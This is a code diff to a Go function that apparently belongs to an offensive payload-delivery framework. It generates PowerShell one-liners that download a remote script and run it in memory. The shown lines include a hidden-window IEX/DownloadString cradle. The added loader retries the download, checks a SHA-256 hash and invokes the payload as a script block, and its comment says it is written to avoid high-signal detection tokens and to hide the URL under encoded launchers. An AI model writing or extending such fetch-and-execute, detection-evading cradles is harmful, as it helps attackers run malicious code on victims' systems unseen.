@@ -366,6 +366,14 @@ func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, p
 				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
 				strings.ReplaceAll(proxy, "'", "''"), payloadURL),
 		})
+		if sha256hex != "" {
+			items = append(items, oneLinerItem{
+				Name: "PS1 Verified Memory Load (obfuscated)",
+				Desc: "Memory-only download with 3 retries and SHA-256 check; launcher follows the selected obfuscation preset",
+				Command: obfuscation.GenerateCommandLineOneLinerWithOptions(
+					ps1VerifiedMemoryLoader(payloadURL, sha256hex), psOpts),
+			})
+		}
 
 	case "linux":
 		items = append(items, oneLinerItem{
@@ -415,4 +423,16 @@ func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, p
 	}
 
 	return items
+}
+
+// ps1VerifiedMemoryLoader is the inner script for the PS1 download cradle.
+// It keeps the script off disk, retries a short blackhole, checks the SHA-256
+// that the server published with the hosted payload, and only then invokes
+// it. It deliberately avoids IEX/DownloadString so the command line does not
+// carry the two highest-signal cradle tokens; the caller wraps the whole
+// script in the operator-selected PowerShell launcher (so even the URL and
+// digest disappear from the command line under -enc/XOR presets).
+func ps1VerifiedMemoryLoader(payloadURL, sha256hex string) string {
+	return fmt.Sprintf(`$u='%s';$h='%s';$wc=New-Object Net.WebClient;for($i=0;$i -lt 3;$i++){try{$b=$wc.DownloadData($u);$d=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($b)).Replace('-','').ToLower();if($d -eq $h){([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($b))).Invoke();break}}catch{};Start-Sleep -Seconds 2}`,
+		strings.ReplaceAll(payloadURL, "'", "''"), strings.ToLower(sha256hex))
 }
